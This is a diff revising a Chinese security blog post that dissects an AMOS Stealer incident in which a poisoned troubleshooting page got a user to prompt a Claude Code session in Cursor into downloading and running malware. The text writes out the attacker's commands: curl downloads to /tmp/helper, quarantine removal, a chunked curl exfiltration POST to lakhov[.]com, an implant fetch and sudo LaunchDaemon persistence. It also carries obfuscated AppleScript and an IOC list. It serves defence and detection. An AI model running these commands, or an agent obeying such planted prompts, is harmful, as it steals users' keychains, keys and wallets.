@@ -2,15 +2,16 @@
 title: "AI Coding Agent 的新型攻击面：AMOS Stealer 通过 Cursor 会话投递实录"
 date: "2026-06-20T15:25:00+08:00"
 slug: "ai-coding-agent-new-attack-surface-amos-stealer-cursor"
-description: "Field Effect 2026-04-23 真实事件复盘：AMOS Stealer 通过 Cursor AI Agent + Claude Code session 在 2 分钟内窃取 Keychain、SSH keys、加密钱包凭据，揭示 AI Coding agent 作为新型 malware delivery 通道的工程化风险与防御盲区。"
+description: "Field Effect 真实事件复盘（2026-04-23 检测，04-24 披露）：AMOS Stealer 通过 Cursor 中的 Claude Code 会话投递，2 分钟内窃取 Keychain、SSH keys、加密钱包凭据，揭示 AI Coding agent 作为新型 malware delivery 通道的工程化风险与防御盲区。"
 tags: ["AI 安全", "AI Coding Agent", "Cursor", "MITRE ATT&CK", "Claude Code", "AI Infra"]
 categories: ["技术笔记"]
 draft: false
+lastmod: "2026-09-26T10:00:00+08:00"
 ---
 
 > **作者**：钳岳星君
-> **来源**：Field Effect 2026-04-23 事件披露 blog（fieldeffect.com/blog/field-effect-detects-amos-stealer-delivered-via-cursor-ai-agent-session，2026-06-20 抓取）
-> **版本**：v4 — 校正 ATT&CK TTP 计数，补沙箱逃逸、密码校验与采集目标细节
+> **来源**：Field Effect 事件披露 blog（fieldeffect.com/blog/field-effect-detects-amos-stealer-delivered-via-cursor-ai-agent-session，2026-04-24 发布，2026-06-20 抓取）
+> **版本**：v5 — 对源逐条复核：修正 T1037.001 名称与 M1037/M1038 描述、补齐持久化链（LaunchDaemon plist 路径与第二阶段下载源）、删除无来源数字、补 IOC 清单与打包分片命令
 
 ---
 
@@ -40,9 +41,9 @@ draft: false
 
 ## §1 完整攻击链：从 SEO 诱导到 2 分钟数据外泄
 
-**Step 1 — 投递**：受害者通过搜索引擎找到一篇**伪装成 Claude Code troubleshooting 指南**的网页。这是 AMOS 长期使用的 ClickFix 风格 SEO poisoning，诱饵换成"AI 编程助手出问题了怎么办"。
+**Step 1 — 投递**：受害者通过搜索引擎找到一篇**伪装成 Claude Code troubleshooting 指南**的网页。这是 ClickFix 风格的 SEO poisoning——AMOS 家族长期借助这类"出问题了？照着做修复一下"的诱饵分发恶意负载，这次只是把诱饵换成了"AI 编程助手出问题了怎么办"。
 
-**Step 2 — 社工**：网页引导用户在 Cursor 里输入一条 prompt，让 agent"修复"问题。Agent 收到 prompt 后开始执行。
+**Step 2 — 社工**：网页引导用户在 Cursor 里输入一条 prompt，让 agent"修复"问题。源文明确指出，出事的环境是 **Cursor 里运行的 Claude Code 会话**——agent 收到 prompt 后开始执行。
 
 **Step 3 — 下载**：Cursor agent 主动执行 `curl`，从 `arkypc[.]com/curl/<SHA256_Hash>` 和 `arkypc[.]com/n8n/update` 下载文件到 `/tmp/helper`。`n8n/update` 的路径名刻意伪装成 AI workflow 工具更新。
 
@@ -61,29 +62,42 @@ chmod +x /tmp/helper    # 加执行权限
 
 `xattr -c` 这一步是 macOS 攻击的经典操作——Apple Silicon 上从浏览器下载的文件会被自动打上 `com.apple.quarantine` 标记，Gatekeeper 会拦截执行。Cursor agent 主动清掉这个标记，等于绕过了 macOS 的核心防线之一。
 
-**Step 5 — 投递 AppleScript**：`/tmp/helper` 紧接着投递了两个串行的 AppleScript 脚本。第一个做沙箱逃逸——调用 `system_profiler SPMemoryDataType` 和 `system_profiler SPHardwareDataType`，把结果跟已知 hypervisor 和虚拟机字符串（`QEMU`、`VMware`、`KVM`，以及一批 Apple 硬件 ID 和 `Virtual Machine` 等）比对，命中就 `exit 100` 直接中断，不继续跑 payload。第二个才是完整的 AMOS payload。
+**Step 5 — 投递 AppleScript**：`/tmp/helper` 紧接着投递了两个串行的 AppleScript 脚本。第一个做反沙箱检测——调用 `system_profiler SPMemoryDataType` 和 `system_profiler SPHardwareDataType`，把结果跟已知 hypervisor 和虚拟机字符串（`QEMU`、`VMware`、`KVM`，以及 `Virtual Machine`、一批 Apple 硬件标识等）比对，命中就 `exit 100` 直接中断，不继续跑 payload。第二个才是完整的 AMOS payload。
 
 **Step 6 — 诱骗用户授权**：payload 弹出对话框要求用户输入**本地账户密码**。输入后用 `dscl . authonly <username> <password>` 本地校验（macOS 目录服务的认证命令，返回空串即密码正确）——用户输对一次，攻击者就拿到了可用于 `sudo` 提权的明文凭据。这是 macOS 上获得"管理员权限"的关键诱骗。
 
 **Step 7 — 收集数据**：AMOS 在受害机器上读取（源文公开的部分采集命令）：
 
-- macOS Keychain（`~/Library/Keychains/login.keychain-db`）
-- 浏览器保存的密码、cookie、历史与表单记录（Chrome / Firefox 的 `Login Data`、`Cookies`、`logins.json` 等）
-- `/Users/*/.ssh/` 下的 SSH 私钥、`known_hosts` 与 `config`
-- 加密钱包浏览器扩展与应用（MetaMask、Phantom、TonKeeper、Binance 等，扩展通过一组硬编码 ID 匹配）
-- 云与工具凭据：`~/.aws/`、`~/.config/gcloud/`、`~/.docker/config.json`、FileZilla 站点、Telegram Desktop 的 `key_datas`
+- macOS Keychain（`~/Library/Keychains/login.keychain-db`），并用 `security find-generic-password` 直接取出 Chrome 保存密码所依赖的 Safe Storage 密钥
+- 浏览器保存的密码、cookie、历史、表单与本地存储（Chrome / Firefox 的 `Login Data`、`Cookies`、`logins.json`、`cookies.sqlite`、`key4.db` 等）
+- `/Users/*/.ssh/` 下的 SSH 私钥、公钥、`known_hosts` 与 `config`
+- 加密钱包：Binance、TonKeeper 等应用，另用一份较长的硬编码 Chromium 扩展 ID 清单匹配浏览器钱包扩展
+- 云与工具凭据：`~/.aws/`、`~/.config/gcloud/`、`~/.docker/config.json`、FileZilla 站点、Telegram Desktop 的 tdata（含 `key_datas`），连 shell 历史（`.zsh_history`）也不放过
 - 系统级 credential store
 
-**Step 8 — 打包 + 分片外传**：数据被压缩到 `/tmp/out.zip`，然后用 `curl` 拆成 25MB 一片上传到 `lakhov[.]com`：
+**Step 8 — 打包 + 分片外传**：数据先经 `ditto` 打包、`split` 切片，再用 `curl` 逐片 POST 到 `lakhov[.]com`：
 
 ```bash
+ditto -c -k --sequesterRsrc /tmp/ /tmp/out.zip
+split -b 26214400 /tmp/out.zip /tmp/chunk_
+
 curl --connect-timeout 120 --max-time 300 -X POST \
   -H user: <data> -H BuildID: <data> -H cl: 0 -H cn: 0 \
   -H X-Chunk-ID: <data> -H X-Chunk-Part: 0 -H X-Chunk-Total: 2 \
   -F file=@/tmp/chunk_aa https://lakhov[.]com/contact
 ```
 
-**Step 9 — 持久化**：在"smash and grab"完成后，攻击者还顺手装了一个**持久化 implant**到 `/Users/<username>/Library/Application Support/.com.apple.accountsd/AccountsHelper`，伪装成 macOS 的 accountsd 服务。`.com.apple.accountsd` 这个命名空间属于 Apple 自家服务目录，普通用户和管理员肉眼很难分辨。
+每片 26214400 字节即 25MB；源文记录了两个分片（`chunk_aa`、`chunk_ab`），域名解析失败时回退直连 IP `92.246.136[.]14`。外传校验完成后，本地产物会被删除。
+
+**Step 9 — 持久化**："smash and grab" 得手后，攻击者还补了一步长期驻留：从 `ouilov[.]com/zxc/kito` 下载 implant，存到 `/Users/<username>/Library/Application Support/.com.apple.accountsd/AccountsHelper`，再用拿到的 sudo 权限把启动项写入系统级目录并加载：
+
+```bash
+sudo -S cp /tmp/starter /Library/LaunchDaemons/com.apple.accountsd.helper.plist
+sudo -S chown root:wheel /Library/LaunchDaemons/com.apple.accountsd.helper.plist
+sudo -S launchctl load /Library/LaunchDaemons/com.apple.accountsd.helper.plist
+```
+
+这条链上每一环都在伪装：implant 文件落在 `.com.apple.accountsd` 这个 Apple 自家服务命名空间下，启动项命名为 `com.apple.accountsd.helper.plist`，普通用户和管理员肉眼都很难分辨。
 
 **Step 10 — 总耗时 < 2 分钟**。从第一次 curl 到数据上传完成，整个攻击在 2 分钟内闭环。这比人类操作员注意到异常的速度还快。
 
@@ -122,13 +136,14 @@ curl --connect-timeout 120 --max-time 300 -X POST \
 └─────────────────────────────────────────┘
          ↓
 ┌─────────────────────────────────────────┐
-│ /tmp/out.zip → split 25MB chunks        │  ← T1560.001
-│ curl POST lakhov[.]com                  │  ← T1020/T1105
+│ /tmp/out.zip → ditto + split 25MB       │  ← T1560.001
+│ curl POST lakhov[.]com / 92.246.136[.]14│  ← T1020/T1105
 └─────────────────────────────────────────┘
          ↓
 ┌─────────────────────────────────────────┐
-│ 持久化 implant: AccountsHelper           │  ← T1543.004/T1036.005
-│ /Users/.../.com.apple.accountsd/         │
+│ implant: AccountsHelper (ouilov[.]com)  │  ← T1543.004/T1036.005
+│ plist: /Library/LaunchDaemons/          │
+│        com.apple.accountsd.helper.plist │
 └─────────────────────────────────────────┘
          ↓
 [全程 < 2 分钟]
@@ -173,11 +188,11 @@ on cqfjdxlx(jsordsqub, eqhvrkhfxwif, tirvglkgcf)
         do shell script mjhuumxw198 & quoted form of mfnnetgczcs
 ```
 
-**核心机制**：两个整数列表相减 + 转 charcode。第一个列表是被编码的字符串 charcode 加上偏移，第二个列表是 key 偏移。两两相减还原原字符。这种 string obfuscation 套路在很多 APT 组织的样本里都出现过，这里套了 AppleScript 的皮。
+**核心机制**：整数列表 + 偏移还原。攻击者准备了三个解码函数：第一个从编码值里减去 key 偏移（带 mod 9999 的计数器），第二个反向做加法，第三个减去基础偏移加 key 偏移。每段被编码的字符串配一组整数列表，运行时逐字符还原。这种 string obfuscation 套路在很多 APT 组织的样本里都出现过，这里套了 AppleScript 的皮。有个耐人寻味的细节：持久化脚本里的变量 `botDir` 忘了混淆——工整和疏漏并存，是真实样本的常态。
 
 这层混淆能有效绕过 agent 的代码审查：**当你让 Cursor 看一眼这个脚本"安不安全"，它看到的是一堆无意义的数学运算 + 通用函数名**。如果你让 Cursor "执行这个脚本"——它会执行 `do shell script` 行，那才是 payload。混淆之所以有效，是因为 agent 的代码审查能力依赖语义理解，而 charcode 偏移在语义层面不可读——agent 无法从 `{130, 260, 211, 208}` 反推出这是哪个字符串，自然也无法判断这段脚本会调用什么系统资源。
 
-防御混淆要靠**行为侧**，靠"agent 自己看代码"这条路走不通。这次 attack 的关键 IO 行为（curl 不常见域名 + chmod 系统目录 + AppleScript 读 Keychain）才是真正可检测的信号。
+防御混淆要靠**行为侧**，靠"agent 自己看代码"这条路走不通。这次 attack 的关键 IO 行为（curl 直奔陌生域名 + `xattr -c` 清隔离标记 + AppleScript 读 Keychain）才是真正可检测的信号。
 
 ---
 
@@ -190,16 +205,16 @@ Field Effect 把这次攻击完整映射到了 MITRE ATT&CK 框架。它给的�
 | TTP | 技术 | 本次攻击的具体行为 |
 |---|---|---|
 | T1204.002 | 用户执行恶意文件 | 用户在 Cursor 里输入 prompt 触发 agent 下载 helper |
-| T1059.002 | AppleScript | 两个串行 obfuscated AppleScript 跑 sandbox 逃逸 + AMOS payload |
+| T1059.002 | AppleScript | 两个串行 obfuscated AppleScript 跑反沙箱检测 + AMOS payload |
 | T1059.004 | Unix Shell | `xattr -c` + `chmod +x` + `/tmp/helper` + `curl` POST |
 
 ### Persistence + Defense Evasion（持久化 + 防御逃逸）
 
 | TTP | 技术 | 本次攻击的具体行为 |
 |---|---|---|
-| T1543.004 | LaunchDaemon | 持久化 implant 安装到 `~/Library/Application Support/.com.apple.accountsd/` |
-| T1037.001 | LaunchAgent | 同上路径（macOS 的 .com.apple.* 命名空间是 Apple 自家服务） |
-| T1036.005 | Match Legitimate Name | AccountsHelper 名字伪装成系统服务 |
+| T1543.004 | Launch Daemon | 用 sudo 把 `com.apple.accountsd.helper.plist` 写入 `/Library/LaunchDaemons/` 并 `launchctl load` 加载 |
+| T1037.001 | Logon Scripts (macOS) | 源文将登录初始化脚本技术列入本次持久化映射 |
+| T1036.005 | Match Legitimate Name | AccountsHelper 名字与 `.com.apple.*` 命名空间伪装成系统服务 |
 | T1027 | Obfuscated Files or Information | charcode 偏移 + 通用函数名（cqfjdxlx / mjhuumxw192） |
 
 ### Credential Access（凭据访问）
@@ -207,7 +222,7 @@ Field Effect 把这次攻击完整映射到了 MITRE ATT&CK 框架。它给的�
 | TTP | 技术 | 本次攻击的具体行为 |
 |---|---|---|
 | T1555.003 | Credentials from Password Stores（Keychain） | 读 macOS Keychain |
-| T1003.003 | OS Credential Dumping | 浏览器保存密码 / SSH keys / crypto wallets |
+| T1003.003 | OS Credential Dumping（源文映射口径） | 浏览器保存密码 / SSH keys / crypto wallets |
 | T1056.002 | GUI Input Capture | 弹"请输入密码"对话框 |
 | T1556.001 | Authentication Package | 拿到用户密码后 sudo 提权 |
 
@@ -215,14 +230,14 @@ Field Effect 把这次攻击完整映射到了 MITRE ATT&CK 框架。它给的�
 
 | TTP | 技术 | 本次攻击的具体行为 |
 |---|---|---|
-| T1105 | Ingress Tool Transfer | curl 下载 helper + chunks 外传 |
-| T1090.003 | Multi-hop Proxy | 走 lakhov[.].com / arkypc[.]com 多级 |
+| T1105 | Ingress Tool Transfer | curl 下载 helper + implant + chunks 外传 |
+| T1090.003 | Multi-hop Proxy | 源文映射项；攻击链涉及多个分发/回收域名与直连 IP 备援 |
 
 ### Collection + Exfiltration（收集 + 外传）
 
 | TTP | 技术 | 本次攻击的具体行为 |
 |---|---|---|
-| T1560.001 | Archive Collected Data | `/tmp/out.zip` 打包 |
+| T1560.001 | Archive via Utility | `ditto` 打包 `/tmp/out.zip` |
 | T1020 | Automated Exfiltration | 25MB chunks 自动 POST |
 | T1005 | Data from Local System | 浏览器 / Keychain / SSH / wallets |
 
@@ -230,16 +245,16 @@ Field Effect 把这次攻击完整映射到了 MITRE ATT&CK 框架。它给的�
 
 | TTP | 技术 | 本次攻击的具体行为 |
 |---|---|---|
-| T1082 | System Information Discovery | sandbox 逃逸第一阶段 |
-| T1016 | System Network Configuration Discovery | 内部网络扫描 |
-| T1057 | Process Discovery | 找可利用进程 |
+| T1082 | System Information Discovery | 反沙箱检测第一阶段，读硬件与内存信息 |
+| T1016 | System Network Configuration Discovery | 源文映射的网络配置发现 |
+| T1057 | Process Discovery | 源文映射的进程枚举 |
 
 ### Response（响应）
 
 | 缓解措施 | 说明 |
 |---|---|
-| M1037 | 自动化响应（endpoint isolation） |
-| M1038 | 分析师介入（malware blocking） |
+| M1037 | Filter Network Traffic——网络流量过滤与端点隔离 |
+| M1038 | Execution Prevention——阻止未签名/不可信二进制执行 |
 
 这份映射说明 AMOS 这次走完了**完整的 Cyber Kill Chain**。从社工投递到持久化，每个阶段都对应 ATT&CK 标准。任何一个检测点失效，下一个就会接上——这是工程化 malware 的特征，区别于单点漏洞利用。
 
@@ -247,6 +262,25 @@ Field Effect 把这次攻击完整映射到了 MITRE ATT&CK 框架。它给的�
 
 - 单独看 T1059.002 / T1059.004 / T1204.002 任一项都没用——必须做**关联分析**（curl + xattr + chmod 在 30 秒内 + 来自不常见 domain）
 - 重点监控 T1543.004（LaunchDaemon 变更）+ T1036.005（伪装命名）+ T1056.002（GUI 弹窗要密码）这三个**最不可能在合法 agent 行为里出现**的 TTP
+
+### 4.1 源文公开的 IOC 清单
+
+以下是 Field Effect 披露的失陷指标，供自查与检测规则参考：
+
+| 类型 | 值 | 用途 |
+|---|---|---|
+| 域名 | `arkypc[.]com` | loader 下载（伪装 n8n 更新） |
+| 域名 | `lakhov[.]com` | 数据外传 |
+| 域名 | `ouilov[.]com` | implant 第二阶段下载 |
+| 域名 | `foto[.]gd`、`mpasvw[.]com` | 持久化阶段关联基础设施 |
+| IP | `92.246.136[.]14` | 外传回退直连 |
+| IP | `45.94.47[.]204` | 持久化阶段关联基础设施 |
+| SHA256 | `8EF98FD781A6F1869657FC1ACBC9B43A228A99E6FA5FE39C47CCE8AB58066596`（helper，Signing ID: setup） | loader，落点 `/private/tmp/helper` |
+| SHA256 | `C11BFC200C363EF76AD40B717B5A850DAF699F6FA64A26A8ECF7848711BDBD9C`（AccountsHelper，Signing ID: kito） | 持久化 implant |
+| 文件路径 | `/Library/LaunchDaemons/com.apple.accountsd.helper.plist` | 启动项 |
+| 文件路径 | `~/Library/Application Support/.com.apple.accountsd/AccountsHelper` | implant 落点 |
+
+MD5/SHA1 等其余指标见源文 IOC 章节；检测规则建议以域名 + 文件路径 + plist 名称为核心，哈希作辅助。
 
 ---
 
@@ -260,13 +294,13 @@ Field Effect 的检测框架核心是**"behavioral monitoring"**——IOC 黑名
 
 | 行为指标 | Cursor agent 正常工作时 | AMOS 攻击时 |
 |---|---|---|
-| curl 目标域名 | github.com / pypi.org / 公司内网 | arkypc[.]com / lakhov[.]com（注册数月的新域） |
+| curl 目标域名 | github.com / pypi.org / 公司内网 | arkypc[.]com / lakhov[.]com（与业务无关的陌生域） |
 | curl 输出路径 | 项目内 `./node_modules/` / `./dist/` | `/tmp/helper`（系统临时目录） |
 | xattr 命令 | 从不主动清 quarantine | 主动 `xattr -c` 清标记 |
 | chmod 目标 | 项目脚本 | `/tmp/helper` |
 | AppleScript 弹窗 | 偶尔弹"是否允许访问 Documents" | 弹"请输入你的系统密码" |
 | sudo 调用 | 安装 brew / npm 全局包时 | `echo '<password>' \| sudo -S <command>`（明文管道） |
-| LaunchDaemon 修改 | 从不修改 | 写 `~/Library/Application Support/.com.apple.accountsd/` |
+| LaunchDaemon 修改 | 从不修改 | 写 `/Library/LaunchDaemons/com.apple.accountsd.helper.plist` 并加载 |
 | Keychain 访问 | 一次 Xcode 签名时 | 一次性 dump 全部 Keychain |
 | 数据流向 | 出项目外 = 用户主动 | out.zip + chunks POST 到境外 |
 | 时间窗 | 长（开发周期） | 短（< 2 分钟） |
@@ -275,7 +309,7 @@ Field Effect 的检测框架核心是**"behavioral monitoring"**——IOC 黑名
 
 ### 5.2 核心检测规则（4 类关键行为）
 
-1. **AppleScript 弹密码对话框**——正常 agent 永远不会主动弹"请输入你的系统密码"。这条规则的误报率极低（估计 < 0.1%，Field Effect 未公开具体数字，按工程经验判断）。
+1. **AppleScript 弹密码对话框**——正常 agent 不会主动弹"请输入你的系统密码"，这条规则几乎不会误报。
 2. **untrusted/scripting software 访问浏览器数据**——`~/Library/Application Support/Google/Chrome/Default/Login Data` 被非浏览器进程读取，必须告警。
 3. **LaunchDaemon/LaunchAgent 的 .plist 文件被非系统进程修改**——任何写 `/Library/LaunchDaemons/` 或 `~/Library/LaunchAgents/` 的进程都该被审计。
 4. **`sh -c echo '<password>' | sudo -S <command>`**——明文管道密码到 sudo 是 100% 可疑行为，合法系统从不这么干。
@@ -284,13 +318,13 @@ Field Effect 的检测框架核心是**"behavioral monitoring"**——IOC 黑名
 
 > "we recommend auditing use of sensitive commands such as `curl` and `chmod`"
 
-把所有 `curl` + `chmod` + `xattr` + `osascript` + `sudo` 命令打到 SIEM，加**异常检测**。正常开发的 curl 通常访问 github / pypi / 公司内网，异常 curl 访问 arkypc[.]com 这种注册仅几个月的域名是长尾的 0.1%。
+把所有 `curl` + `chmod` + `xattr` + `osascript` + `sudo` 命令打到 SIEM，加**异常检测**。正常开发的 curl 通常访问 github / pypi / 公司内网，直奔陌生域名的 curl 在日常流量里是显眼的少数。
 
 ### 5.3 对中国企业的实操建议
 
 - 单一 EDR 不够。**AppleScript 弹窗 + curl 异常 + LaunchDaemon 变更**需要 3 套独立检测串起来
 - 行为监测的关键在**时间窗口内的关联**，单条 curl 不可疑，curl + xattr + chmod + sudo 在 30 秒内就极度可疑
-- 员工 Mac 设备的检测盲区：很多企业只给 Windows 装 EDR，macOS 端点监控覆盖率普遍偏低（公开调研数据缺乏，按行业经验多数企业不足 30%）——AMOS 这类 malware 正好落在盲区里
+- 员工 Mac 设备的检测盲区：很多企业只给 Windows 装 EDR，macOS 端点的监控覆盖率普遍偏低——AMOS 这类 malware 正好落在盲区里
 
 ---
 
@@ -302,15 +336,15 @@ AI Coding agent 收到 prompt 后的默认行为是**听话执行**，除非你�
 
 **立刻可做的 3 个配置**：
 
-- Cursor：开启 "Always run in sandbox" + 配置 allowlist domain
-- Claude Code：用 `--permission-mode acceptEdits` 限制自动执行范围，避免 `--dangerously-skip-permissions` 全开
-- Aider / Cline：加 `--no-auto-commit` 避免自动跑 git 操作
+- Cursor：开启终端命令沙箱（sandboxed terminal），并保持命令逐条确认，不要全局放行
+- Claude Code：用 `--permission-mode acceptEdits` 把自动放行限制在文件编辑，避免 `--dangerously-skip-permissions` 全开
+- Aider：加 `--no-auto-commits`，别让 agent 自动提交 git；Cline：在 Auto-approve 设置里不放行终端命令
 
 ### 启示二：区分"agent 行为"和"用户行为"的审计入口
 
 传统 EDR 把"用户执行 X 命令"和"agent 执行 X 命令"混在一起——这是这次 AMOS 攻击难检测的核心原因之一。**企业内部应该**：
 
-- 给所有 AI Coding agent 单独的 audit log（哪怕只是 `~/.cursor/activity.log` + `~/.claude/sessions/` 备份）
+- 给所有 AI Coding agent 单独留审计入口：Claude Code 的会话日志在 `~/.claude/projects/<项目目录>/` 下的 jsonl 文件，Cursor 的会话数据存于其 SQLite 数据库，都值得定期备份
 - 定期 grep `curl` / `chmod` / `xattr` / `osascript` / `sudo` 这 5 个高危命令
 - 把"agent 跑了不常见 domain"作为 SIEM 规则
 
@@ -342,7 +376,7 @@ AI Coding agent 收到 prompt 后的默认行为是**听话执行**，除非你�
 
 1. **第一天**：完成启示一的 3 个配置（10 分钟内可做完），关闭 agent 的全开权限
 2. **第一周**：完成启示三的 3 件事，把高价值凭据从 Keychain 迁出
-3. **第一个月**：完成启示二的审计入口搭建，至少把 `~/.cursor/activity.log` 和 `~/.claude/sessions/` 接到 SIEM
+3. **第一个月**：完成启示二的审计入口搭建，至少把 Claude Code 的会话日志接到 SIEM
 
 这个顺序的逻辑是：先堵住"agent 主动跑恶意命令"的入口，再处理"凭据已经失陷"的最坏情况，最后补上"事后能查到"的审计能力。前两步是预防，第三步是兜底。
 
@@ -390,14 +424,14 @@ AI Coding Agent 成为新攻击面的核心原因是**结构性矛盾**：
 
 charcode 混淆技术能有效绕过 Agent 代码审查的原因是：
 
-**技术原理**：攻击者的 AppleScript 使用两个整数列表相减 + 转 charcode。第一个列表是被编码的字符串 charcode 加上偏移，第二个列表是 key 偏移。两两相减还原原字符。
+**技术原理**：攻击者的 AppleScript 用整数列表 + 偏移还原字符串，三个解码函数分别做减 key 偏移（带 mod 9999 计数器）、加 key 偏移、减基础偏移加 key 偏移，运行时逐字符还原。
 
 **绕过机制**：
 1. **语义不可读**：Agent 的代码审查能力依赖语义理解，而 charcode 偏移在语义层面不可读
 2. **无法反推**：Agent 无法从 `{130, 260, 211, 208}` 这类整数列表反推出这是哪个字符串
 3. **混淆层有效**：当你让 Cursor 看这个脚本"安不安全"，它看到的是一堆无意义的数学运算 + 通用函数名
 
-**防御策略**：不能靠"Agent 自己看代码"来防御混淆，必须靠**行为侧检测**——curl 不常见域名 + chmod 系统目录 + AppleScript 读 Keychain 才是真正可检测的信号。
+**防御策略**：不能靠"Agent 自己看代码"来防御混淆，必须靠**行为侧检测**——curl 直奔陌生域名 + `xattr -c` 清隔离标记 + AppleScript 读 Keychain 才是真正可检测的信号。
 
 </details>
 
@@ -430,12 +464,12 @@ Field Effect 检测框架的核心是**"behavioral monitoring"（行为监测）
 
 **启示一**：把 AI agent 当成"会主动执行命令的初级工程师"对待
 - 在 system prompt 里明确告诉它"任何 curl 都需要先确认"
-- Cursor：开启 "Always run in sandbox" + 配置 allowlist domain
+- Cursor：开启终端命令沙箱，保持命令逐条确认
 - Claude Code：用 `--permission-mode acceptEdits` 限制自动执行范围
-- Aider/Cline：加 `--no-auto-commit` 避免自动跑 git 操作
+- Aider：加 `--no-auto-commits`；Cline：Auto-approve 里不放行终端命令
 
 **启示二**：区分"agent 行为"和"用户行为"的审计入口
-- 给所有 AI Coding agent 单独的 audit log
+- 给所有 AI Coding agent 单独留审计入口（如 Claude Code 的 `~/.claude/projects/` 会话日志）
 - 定期 grep `curl` / `chmod` / `xattr` / `osascript` / `sudo` 这 5 个高危命令
 - 把"agent 跑了不常见 domain"作为 SIEM 规则
 
@@ -458,7 +492,7 @@ Field Effect 检测框架的核心是**"behavioral monitoring"（行为监测）
 
 1. 检查 agent 是否有全开执行权限
 2. 检查是否配置了 sandbox 或 `--permission-mode`
-3. 检查 `~/.cursor/activity.log` 或 `~/.claude/sessions/` 是否启用
+3. 检查 agent 的会话日志位置（如 Claude Code 的 `~/.claude/projects/`）并确认可留存
 4. 检查 Keychain 中是否存储了高价值凭据
 
 **目标**：理解当前配置的安全风险。
@@ -547,23 +581,23 @@ Field Effect 检测框架的核心是**"behavioral monitoring"（行为监测）
 
 立即执行以下检查：
 
-1. 检查 `~/.cursor/activity.log` 或 `~/.claude/sessions/` 中是否有异常的命令执行记录
+1. 检查 agent 的会话记录（如 Claude Code 的 `~/.claude/projects/`、Cursor 的会话数据库）中是否有异常的命令执行记录
 2. 检查系统进程和网络连接，看是否有未知的后台程序
 3. 检查 Keychain 中是否有被导出的凭据
 4. 更改所有存储在 Keychain 中的密码、API key、SSH 私钥
-5. 如果使用 macOS，检查 `~/Library/Application Support/` 下是否有异常隐藏目录
+5. 如果使用 macOS，检查 `~/Library/Application Support/` 下是否有异常隐藏目录，以及 `/Library/LaunchDaemons/` 里是否有可疑 plist
 
 ---
 
 ## 资料口径说明
 
-本文基于 Field Effect 2026-04-23 事件披露 blog（[field-effect-detects-amos-stealer-delivered-via-cursor-ai-agent-session](https://fieldeffect.com/blog/field-effect-detects-amos-stealer-delivered-via-cursor-ai-agent-session)，2026-06-20 抓取）撰写。需要说明的边界：
+本文基于 Field Effect 事件披露 blog（[field-effect-detects-amos-stealer-delivered-via-cursor-ai-agent-session](https://fieldeffect.com/blog/field-effect-detects-amos-stealer-delivered-via-cursor-ai-agent-session)，2026-04-24 发布，2026-06-20 抓取）撰写。需要说明的边界：
 
-1. **信息来源与时效性**：本文核心攻击链、ATT&CK 映射、检测策略均来自 Field Effect 的公开披露。AMOS Stealer 样本已清除，部分技术细节（如 charcode 偏移的具体整数列表）无法独立验证。本文撰写时（2026-06），Cursor、Claude Code 等 AI Coding Agent 的安全配置仍在快速迭代，请以各工具最新文档为准。
+1. **信息来源与时效性**：本文核心攻击链、ATT&CK 映射、检测策略与 IOC 均来自 Field Effect 的公开披露，检测发生于 2026-04-23。部分技术细节（如 charcode 偏移的具体整数列表）无法独立验证。本文撰写时（2026-06），Cursor、Claude Code 等 AI Coding Agent 的安全配置仍在快速迭代，请以各工具最新文档为准。
 2. **攻击样本无法独立复现**：本文描述的攻击链基于 Field Effect 的 MDR 检测记录，非作者独立复现。建议在隔离虚拟机环境中参考本文做攻击模拟，不要在生产环境尝试。
-3. **MITRE ATT&CK 映射的局限性**：本文的 ATT&CK 映射基于 Field Effect 的公开分析，非 MITRE 官方评估。实际检测规则需要结合具体 EDR/XDR 产品能力调整。
+3. **MITRE ATT&CK 映射的局限性**：本文的 ATT&CK 映射基于 Field Effect 的公开分析，非 MITRE 官方评估——其中个别技术的归属（如 T1003.003 用于 macOS 凭据收集）沿袭源文口径，与 MITRE 官方定义存在出入。实际检测规则需要结合具体 EDR/XDR 产品能力调整。
 4. **防御建议的适用边界**：本文给的 3 条可执行启示（sandbox 配置、审计日志、Keychain 迁移）基于工程经验，但具体配置路径会因 AI Coding Agent 版本、操作系统版本、MDM 策略而变化。企业环境请结合自身 IT 策略调整。
-5. **平台覆盖范围**：本文聚焦 macOS 平台（AppleScript、Keychain、Gatekeeper），Linux 和 Windows 上的 AI Coding Agent 攻击面未覆盖。Linux 上的等价攻击可能通过 `.bashrc` 注入、cron job 持久化、葡萄酒运行 macOS 恶意代码等方式，不在本文讨论范围。
-6. **更新记录**：本文 v1（2026-06-20）为初稿；v2（2026-06-28）添加学习目标、目录、自测题、练习、进阶路径、FAQ；v3（2026-07-01）添加资料口径说明；v4 校正 ATT&CK TTP 计数为 19，补充沙箱逃逸、密码校验与采集目标等源文细节。
+5. **平台覆盖范围**：本文聚焦 macOS 平台（AppleScript、Keychain、Gatekeeper），Linux 和 Windows 上的 AI Coding Agent 攻击面未覆盖。Linux 上的等价攻击可能通过 `.bashrc` 注入、cron job 持久化、Wine 等兼容层执行恶意程序等方式实现，不在本文讨论范围。
+6. **更新记录**：本文 v1（2026-06-20）为初稿；v2（2026-06-28）添加学习目标、目录、自测题、练习、进阶路径、FAQ；v3（2026-07-01）添加资料口径说明；v4 校正 ATT&CK TTP 计数为 19，补充反沙箱检测、密码校验与采集目标等源文细节；v5（2026-09-26）对照源文逐条复核：修正 T1037.001 与 M1037/M1038 描述、补齐持久化链与 IOC 清单、删除无来源数字、更正工具配置参数。
 
 ---
